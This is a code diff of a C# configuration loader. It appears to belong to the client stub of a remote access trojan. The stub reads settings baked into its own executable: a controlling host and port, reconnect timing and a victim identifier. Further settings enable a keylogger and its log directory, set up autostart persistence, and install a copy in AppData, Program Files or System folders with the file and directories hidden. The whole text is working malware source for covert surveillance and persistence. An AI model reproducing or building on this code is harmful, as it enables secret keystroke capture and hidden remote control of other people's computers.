@@ -11,33 +11,35 @@ namespace Client.Controllers.Tools
 {
     //BootController
     public class Boot
-    {
-        //Thread Deco
-        public Socket socket;
-        public IPEndPoint iep;
-        public TextWriter tw;
-        public TcpClient clientReconnectTries;
-        public bool clientLog;
-        public bool stopReconnectTries;
-        private string[] readerFactory = { "host", "port", "recoTries", "clientID", "klEnabled", "klDirectory", "autoStart", "startupName"};
+    {       
+        private string[] readerKey = { "host", "port", "recoTries", "identifier", "logDir", "startupName", "installPath", "txtSubDirI", "txtFileNameI", "chk"};
 
-        public string host { get; set; }
-        public ushort port { get; set; }
-        public int numReconnectTries { get; set; }
-        public static string clientID { get; set; }
-        public bool klEnabled { get; set; }
-        public string klDirectory { get; set; }
-        public bool autoStart { get; set; }
-        public static string startupName { get; set; }
+        public string host                              { get; set; }     // HOST
+        public ushort port                              { get; set; }     // HOST
+        public int recoTries                            { get; set; }     // TIME BETWEEN RECONNECTION TRIES
+        public static string identifier                 { get; set; }     // CLIENT NAME IDENTIFIER
+        public static bool installStub                  { get; set; }     // INSTALL STUB
+        public static bool hideSubDirectory             { get; set; }     // INSTALL STUB
+        public static bool hideFile                     { get; set; }     // INSTALL STUB
+        public static string installSubDirectory = "";                    // INSTALL STUB
+        public static string installFileName     = "";                    // INSTALL STUB
+        public static bool keyloggerEnabled             { get; set; }     // KEYLOGGER
+        public static bool hideLogsDir                  { get; set; }     // KEYLOGGER
+        public string keyLoggerDirectory                { get; set; }     // KEYLOGGER
+        public static string startupName                { get; set; }     // AUTOSTART STUB
+        public static bool autoStartEnabled             { get; set; }     // AUTOSTART STUB
 
+        public static Environment.SpecialFolder SPECIALFOLDER = Environment.SpecialFolder.ApplicationData; //  	%USERPROFILE%\Application Data
+        public static string DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);
 
 
         public Boot()
         {
-            foreach (string index in readerFactory)
+            foreach (string index in readerKey)
             {
                 doSomethingWithReader(index);
             }
+            FixDirectory();
         }
 
         public static string getMutexKey(StreamReader readerMutex)
@@ -48,45 +50,81 @@ namespace Client.Controllers.Tools
             return mutexKey;
         }
 
-        public void doSomethingWithReader(string readerFactoIndex)
+        public void doSomethingWithReader(string readerkey)
         {
             StreamReader reader = new StreamReader(System.Reflection.Assembly.GetExecutingAssembly().Location);
             
             string readerString = reader.ReadToEnd();
 
-            readerString = readerString.Substring(readerString.IndexOf("-START" + readerFactoIndex + "-"), readerString.IndexOf("-END" + readerFactoIndex + "-") - readerString.IndexOf("-START" + readerFactoIndex + "-"));
+            readerString = readerString.Substring(readerString.IndexOf("-START" + readerkey + "-"), readerString.IndexOf("-END" + readerkey + "-") - readerString.IndexOf("-START" + readerkey + "-"));
 
-            if (readerFactoIndex == "host")
+            // LOG IN SETTINGS
+            if (readerkey == "host")
             {
-                host = readerString.Replace("-START" + readerFactoIndex + "-", "");
+                host = readerString.Replace("-START" + readerkey + "-", "");
             }
-            else if (readerFactoIndex == "port")
+            else if (readerkey == "port")
             {
-                port = ushort.Parse(readerString.Replace("-START" + readerFactoIndex + "-", ""));
+                port = ushort.Parse(readerString.Replace("-START" + readerkey + "-", ""));
             }
-            else if (readerFactoIndex == "recoTries")
+            else if (readerkey == "recoTries")
             {
-                numReconnectTries = int.Parse(readerString.Replace("-START" + readerFactoIndex + "-", ""));
+                recoTries = int.Parse(readerString.Replace("-START" + readerkey + "-", ""));
             }
-            else if (readerFactoIndex == "clientID")
+            else if (readerkey == "identifier")
             {
-                clientID = readerString.Replace("-START" + readerFactoIndex + "-", "");                
+                identifier = readerString.Replace("-START" + readerkey + "-", "");                
             }
-            else if (readerFactoIndex == "klEnabled")
+            // KEYLOGGER SETTINGS
+            else if (readerkey == "logDir")
             {
-                klEnabled = (readerString.Replace("-START" + readerFactoIndex + "-", "") == "True" ? true : false);
+                keyLoggerDirectory = readerString.Replace("-START" + readerkey + "-", "");
             }
-            else if (readerFactoIndex == "klDirectory")
+            // AUTOSTART SETTINGS
+            else if (readerkey == "startupName")
             {
-                klDirectory = readerString.Replace("-START" + readerFactoIndex + "-", "");
+                startupName = readerString.Replace("-START" + readerkey + "-", "");
             }
-            else if(readerFactoIndex == "autoStart")
+            // INSTALL SETTINGS
+            else if (readerkey == "installPath")
             {
-                autoStart = (readerString.Replace("-START" + readerFactoIndex + "-", "") == "True" ? true : false);
+                string t = readerString.Replace("-START" + readerkey + "-", "");
+                if (t == "1")
+                    SPECIALFOLDER = Environment.SpecialFolder.ApplicationData;
+                else if (t == "2")
+                    SPECIALFOLDER = Environment.SpecialFolder.ProgramFilesX86;
+                else if (t == "3")
+                    SPECIALFOLDER = Environment.SpecialFolder.SystemX86;
+
             }
-            else if (readerFactoIndex == "startupName")
+            else if (readerkey == "txtSubDirI")
             {
-                startupName = readerString.Replace("-START" + readerFactoIndex + "-", "");
+                startupName = readerString.Replace("-START" + readerkey + "-", "");
+            }
+            else if (readerkey == "txtFileNameI")
+            {
+                startupName = readerString.Replace("-START" + readerkey + "-", "");
+            }
+            // BOOLEENS
+            else if (readerkey == "chk")
+            {
+                int i = 0;
+                string t = readerString.Replace("-START" + readerkey + "-", "");
+                foreach (char c in t)
+                {
+                    if      (i == 0)
+                        keyloggerEnabled = (c == '1' ? true : false);
+                    else if (i == 1)
+                        autoStartEnabled = (c == '1' ? true : false);
+                    else if (i == 2)
+                        hideSubDirectory = (c == '1' ? true : false);
+                    else if (i == 3)
+                        hideFile         = (c == '1' ? true : false);
+                    else if (i == 4)
+                        hideLogsDir      = (c == '1' ? true : false);
+
+                    i++;
+                }
             }
             else
             {
@@ -94,7 +132,25 @@ namespace Client.Controllers.Tools
                 return;
             }
 
-            reader.Close();
+            reader.Close(); 
+        }
+
+        static void FixDirectory()
+        {
+            if (AuthenticationController.Win64Bit) return;
+
+            // https://msdn.microsoft.com/en-us/library/system.environment.specialfolder(v=vs.110).aspx
+            switch (SPECIALFOLDER)
+            {
+                case Environment.SpecialFolder.ProgramFilesX86:
+                    SPECIALFOLDER = Environment.SpecialFolder.ProgramFiles;
+                    break;
+                case Environment.SpecialFolder.SystemX86:
+                    SPECIALFOLDER = Environment.SpecialFolder.System;
+                    break;
+            }
+
+            DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);
         }
 
         public static bool AddToStartup()
